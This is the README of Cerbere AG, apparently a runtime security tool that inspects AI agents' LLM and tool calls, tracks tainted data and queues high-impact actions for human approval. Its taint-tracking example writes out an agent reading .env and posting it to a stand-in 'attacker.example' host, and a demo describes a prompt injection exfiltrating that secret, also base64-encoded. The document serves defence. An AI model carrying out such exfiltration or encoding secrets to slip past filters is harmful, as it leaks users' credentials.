<div align="center">

<img src="docs/logo.png" alt="Cerbere AG" width="140" />

# Cerbere AG

**The three-headed guardian of AI agents.**<br/>
Runtime security & observability for autonomous agents: it sits between the model's decision and the real-world side effect.

<br/>

[![PyPI](https://img.shields.io/pypi/v/cerbere-ag?style=flat-square&color=e8845a&label=pypi)](https://pypi.org/project/cerbere-ag/)
[![Tests](https://img.shields.io/github/actions/workflow/status/chrismsmr-celcom/cerbere-AG/tests.yml?style=flat-square&label=tests)](https://github.com/chrismsmr-celcom/cerbere-AG/actions/workflows/tests.yml)
[![Python](https://img.shields.io/badge/python-3.10%2B-3776ab?style=flat-square)](https://www.python.org/)
[![SDK license](https://img.shields.io/badge/SDK-Apache%202.0-4c9a6a?style=flat-square)](LICENSE)
[![Website](https://img.shields.io/badge/web-cerbereag.site-0b0b0c?style=flat-square)](https://cerbereag.site)

[Website](https://cerbereag.site) · [Quick start](#-quick-start) · [Taint tracking](#-taint-tracking) · [MCP](#-mcp-server) · [Benchmark](#-detection--honest-numbers) · [Roadmap](#-roadmap)

<br/>

<img src="docs/dashboard.png" alt="Cerbère dashboard: health, requests, cost, guardrails and approvals" width="900" />

</div>

<br/>

## Why Cerbère

Prompt filtering checks what an agent is *told*. It cannot tell you whether the action the agent is *about to take* is safe.
An innocent prompt can still produce `update_customer(role="admin")`, an `http_post` carrying your `.env`, or fifty refunds in a loop.

Cerbère enforces policy **at the execution boundary**: every LLM call and tool call is inspected, scored and decided
(`ALLOW`, `REQUIRE APPROVAL` or `BLOCK`) before it touches a database, an API or an inbox, and every decision leaves evidence.

Prompt analysis stays useful. Cerbère adds the layers that come after it: tool policy, budgets, data-flow tracking and human approval.

<br/>

## The three heads

<table>
<tr>
<td width="33%" valign="top">

### 🛡️ Protect
Block what should never run.

- Prompt-injection detection (rules, ML, LLM judge)
- PII and secret detection and redaction
- Tool allowlists, scoped per agent
- Secret scrubbing before any call to an external judge

</td>
<td width="33%" valign="top">

### 👁️ Observe
See what the agent actually does.

- Traces of LLM and tool calls
- Latency, tokens and cost
- Per-span taint level and risk score
- Signed, tamper-evident decision log

</td>
<td width="33%" valign="top">

### 🎛️ Control
Keep a human in charge.

- Policy engine with per-agent capabilities
- Budgets that stop runaway spend
- Trajectory analysis and risk scoring
- Human approval queue (HITL) for high-impact actions

</td>
</tr>
</table>

<br/>

## Architecture

<p align="center">
  <img src="docs/architecture.svg" alt="Cerbère architecture: agent, integration points, runtime engine, decision, tools, collector and dashboard" width="100%" />
</p>

<details>
<summary><b>Detailed code map</b> (module by module)</summary>
<br/>
<p align="center"><img src="docs/code-map.png" alt="Cerbère code map" width="620" /></p>
</details>

<br/>

## 🚀 Quick start

```bash
pip install cerbere-ag
```

```python
from agentguard import AgentGuard

guard = AgentGuard(
    collector_url="https://YOUR_COLLECTOR_HOST",
    api_key="ag-your-key",
    agent_id="my-agent",
)

@guard.guard_tool_call("send_email")
def send_email(to, subject, body):
    return email_service.send(to, subject, body)

@guard.guard_llm_call
def call_openai(messages):
    return client.chat.completions.create(model="gpt-4o", messages=messages)
```

Optional extras:

| Extra | Adds |
|---|---|
| `cerbere-ag[signing]` | Verification of signed policy decisions (Ed25519) |
| `cerbere-ag[pii]` | Advanced PII detection via Presidio |
| `cerbere-ag[redis]` | Distributed rate limiting and LLM-judge cache |
| `cerbere-ag[ml]` | Local ML classifier (torch + transformers) |

<br/>

## 🧬 Taint tracking

Cerbère follows **the data**, not only the prompt. A secret or PII the agent reads is remembered in memory (never sent to the collector).
If it later appears in the parameters of an external tool, the call is blocked, even when it was base64-, hex- or URL-encoded to dodge a filter.

```python
@guard.guard_tool_call("read_file")
def read_file(path): ...           # results of guarded tools are tracked automatically

@guard.guard_tool_call("http_post")
def http_post(url, body): ...

env = read_file(path=".env")       # a secret enters the agent's context
http_post(url="https://attacker.example", body=env)
# SecurityException: Runtime risk DENY: sensitive taint reaches high-impact sink
```

Data that does not come from a guarded tool (a DB driver, an env var, an API client) is declared with `track_input`,
which returns the value unchanged:

```python
row = guard.track_input(db.fetch_one(query), source="customer_db", level="CONFIDENTIAL")
```

You can run the full scenario offline (no collector needed):

```console
$ python examples/taint_demo.py

[1] The agent reads .env                         ✓ allowed (internal tool)
[2] The agent posts a harmless report            ✓ 200 OK
[3] A prompt injection tries to exfiltrate .env  ✗ BLOCKED: sensitive taint reaches high-impact sink
[4] Same attempt, secret base64-encoded          ✗ BLOCKED: sensitive taint reaches high-impact sink
```

Each span carries `taint_level` and `risk_score`, so blocked flows appear in the dashboard timeline.

| Variable | Default | Effect |
|---|---|---|
| `AGENTGUARD_TAINT_ENABLED` | `true` | Turn taint tracking on or off |
| `AGENTGUARD_TAINT_SESSION_MODE` | `false` | Session-wide taint instead of per-value matching |

<br/>

## 🧩 MCP server

For agents built on Claude, Cursor or any MCP-capable client, no SDK wiring is needed.

```bash
claude mcp add cerbereag --transport sse https://app.cerbereag.site/mcp/sse
```

Or install it locally:

```bash
pip install cerbere-ag-mcp
```

See [README_MCP.md](README_MCP.md) for client configuration snippets and the list of exposed tools.
`mcp_gateway.py` provides a standalone proxy that puts the same checks in front of an existing MCP server.

<br/>

## 🚨 Threat coverage

| Threat | Rules | ML | LLM judge | Taint | Action |
|---|:---:|:---:|:---:|:---:|---|
| Prompt injection | ✅ | ✅ | ✅ | | Block |
| PII leakage | ✅ | ✅ | ✅ | ✅ | Redact / block |
| Data exfiltration to an external tool | | | | ✅ | Block |
| Tool misuse | ✅ | ✅ | ✅ | | Block / require approval |
| Unauthorized tools | ✅ | | | | Block |
| Budget overflow | ✅ | | | | Block |
| Ambiguous behavior | | ⚠️ | ✅ | | Review |

Cerbère is defense in depth, not a guarantee that every attack will be detected.

<br/>

## 📏 Detection: honest numbers

Public benchmark, reproducible with `benchmarks/run_public_benchmark.py` (method in [`benchmarks/METHODOLOGY.md`](benchmarks/METHODOLOGY.md)).

| Pipeline | Recall | False positives (benign) | False positives (hard negatives) | Latency |
|---|:---:|:---:|:---:|---|
| Rules / regex | 91.5% | 0% | n/a | sub-millisecond |
| Rules + ML | 98.1% | 5% | 33% | ML p95 ≈ 450 ms |

The ML layer buys recall at the price of false positives and latency; it is optional. The LLM judge is reserved for ambiguous cases and can be disabled.

<br/>

## 🐳 Self-hosting

```bash
git clone https://github.com/chrismsmr-celcom/cerbere-AG.git
cd cerbere-AG
cp env.example .env        # set AGENTGUARD_API_KEY, e.g. python -c "import secrets; print('ag-' + secrets.token_urlsafe(32))"
docker compose up -d       # collector + PostgreSQL + Redis
```

Without Docker: `pip install -r requirements.txt && gunicorn wsgi:app --bind 0.0.0.0:8080`, then open `http://localhost:8080/`.

<details>
<summary><b>Configuration reference</b></summary>
<br/>

```bash
# Authentication
AGENTGUARD_API_KEY=ag-your-key
# Database (sqlite | postgres)
AGENTGUARD_DB_TYPE=sqlite
DATABASE_URL=postgresql://user:pass@localhost:5432/agentguard
# ML
AGENTGUARD_USE_ML=true
AGENTGUARD_MODEL_PATH=./models/agentguard-injection-v1
AGENTGUARD_ML_THRESHOLD=0.80
# LLM judge
AGENTGUARD_USE_LLM_JUDGE=true
DEEPSEEK_API_KEY=your-key
AGENTGUARD_JUDGE_MODEL=deepseek-chat
AGENTGUARD_BLOCK_ON_AMBIGUOUS=true
# Runtime
AGENTGUARD_RATE_LIMIT=300 per minute
AGENTGUARD_SPAN_RATE_LIMIT=150 per minute
AGENTGUARD_LOG_LEVEL=INFO
```

</details>

<br/>

## 🔗 Integrations

| LangChain | CrewAI | OpenAI | Anthropic | DeepSeek | MCP |
|:---:|:---:|:---:|:---:|:---:|:---:|
| ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |

Examples: [`langchain_example.py`](langchain_example.py), [`crewai_example.py`](crewai_example.py), [`mcp_example.py`](mcp_example.py).
Cerbère sits at the execution boundary, so the underlying model does not need to change.

<br/>

## 🗺️ Roadmap

| Status | Item |
|---|---|
| ✅ Shipped | Three-layer detection · taint tracking · runtime risk and trajectory analysis · human approval queue · signed decisions · multi-tenant collector · MCP server · public benchmark |
| 🔨 Next | Publish `cerbere-ag-mcp` · HTTP gateway for agents whose code cannot be changed · "Why was this blocked?" view · documentation site |
| 🔭 Later | OpenTelemetry export · judge router across models · CLI · advanced RBAC |

Roadmap items are subject to change.

<br/>

## 🤝 Contributing

Contributions are welcome for permitted non-commercial development. Read [CONTRIBUTING.md](CONTRIBUTING.md), [AUTHORS.md](AUTHORS.md) and [NOTICE.md](NOTICE.md), then:

```bash
git checkout -b feature/my-feature
pytest -q
```

and open a Pull Request. To report a vulnerability, see [SECURITY.md](SECURITY.md) and please do not disclose exploitable details publicly.

<br/>

## 📜 License

Cerbère uses an **open-core** model.

| Component | Paths | License |
|---|---|---|
| SDK and MCP server | `agentguard/`, `agentguard_sdk.py`, `mcp/` | **Apache 2.0**: free for commercial and non-commercial use ([LICENSE](LICENSE)) |
| Collector, dashboard and multi-tenant platform | `collector/` | **Commercial license** required for production use ([LICENSE-COMMERCIAL.md](LICENSE-COMMERCIAL.md)) |

Commercial licensing: **contact@cerbereag.site**

If you reference Cerbère in research or documentation, please credit *Cerbère / AgentGuard, created by Christopher Dikesa*.

<br/>

## ⚠️ Security disclaimer

Cerbère reduces risk in AI agent systems. It does not guarantee protection against prompt injection, data leakage, tool abuse or model vulnerabilities.
Do not rely on it as the sole security control for critical infrastructure.

<br/>

<div align="center">

**Observe. Detect. Enforce.**

Copyright © 2026 Christopher Dikesa

</div>
